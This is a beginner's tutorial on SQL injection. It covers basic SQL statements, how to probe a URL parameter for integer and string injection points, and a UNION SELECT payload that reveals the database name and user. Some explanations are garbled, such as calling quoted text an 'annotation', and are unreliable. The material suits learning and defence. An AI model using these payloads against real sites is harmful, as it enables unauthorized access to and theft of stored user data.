# SQL Injection (ver 1.0)

## Section 1
### -What is SQL Injection?
SQL injection is a code injection technique that people can attack data-driven application. Usually, they will try to insert their SQL statements to the filed for execution.
### -Is SQL Injection harmful?
Yes, people can use the SQL statements to copy the application’s database which means all user’s information are public, and they can delete the data which will cause the company to loss huge money to re-build.
### -How does it work?
It is a kind of normal bugs for website application. They usually use the data from front-end directly with their SQL statement, so people can run their statements with some special characters.
### -How can we avoid the SQL injection?
The most useful way is using filter to filter out the special characters before using in the SQL statement. The other way can be using precompiled, so if the statement does not change with input value, we can run the value with statements in the back end.

## Section 2
Before we do SQL Injection challenge, we need to know what SQL statement is.
Assume a table name is users with id, username, password.
(1, A, 1)
(2, B, 2)
(3, C, 3)

### -SELECT (use for selecting data from database)
SELECT username FROM users
Output will be (A, B, C)
### -UPDATE (use for modifying data)
UPDATE users
SET username =” Test”
WHERE id = “1”
(1, Test, 1)
(2, B, 2)
(3, C, 3)

### -WHERE (clause use as filter)
SELECT username FROM users
Output will be (A, B, C)
SELECT username FROM users WHERE id = ‘1’
Output will be (A)

### -DELETE (delete data from database)
DELETE FROM users WHERE id = ‘3’
(1, A, 1)
(2, B, 2)

### -INSERT INTO (insert new data into database)
INSERT INTO users (id, username, password) VALUES (‘4’, ’D’, ’123’)
(1, A, 1)
(2, B, 2)
(3, C, 3)
(4, D, 123)

## Section 3
### -Injection point
Examplewebsite.php?id=1
If we see a web address end with something equal something, we might need to test what kinds of injection.

### -Int injection
Examplewebsite.php?id=1 (Work)
Examplewebsite.php?id=1’ (Error)
Examplewebsite.php?id=1 and 1=1 (Work)
Examplewebsite.php?id=1 and 1=2 (Error)
It will be int injection point.
We can guess the statement might be:
SELECT * FROM * WHERE id=$_GET[‘id’]

### -string injection point
Examplewebsite.php?id=1 (Work)
Examplewebsite.php?id=1’ (Error)
Examplewebsite.php?id=1’and 1=1 (Error)
Examplewebsite.php?id=1’and 1=1%23 (Work)
Examplewebsite.php?id=1’and ‘1’=’1 (Work)
We can guess the statement might be:
SELECT * FROM * WHERE id=’$_GET[‘id’]’

## Section 4
### -To understand how string injection point work
When we add a single quotation mark, the string injection point will report error because the statement is not complete.
SELECT * FROM * WHERE id=’1’
SELECT * FROM * WHERE id=’1’’
The string between two quotation mark will be mark as annotation, so the statement become
SELECT * FROM * WHERE id=’
There is why the website will report error.
### -Using “UNION” to get more information
UNION (combine the result set of two or more SELECT statement)
If we input the “’UNION SELECT database(), user()#”,
Before: SELECT * FROM * WHERE id=’1 ’UNION SELECT database(), user()#’
After: SELECT * FROM * WHERE id= UNION SELECT database(), user()#’
Basic on the SQL statement, string after # will be mark as annotation, so the output will be the database name and username of running this statement in the data-driven application.










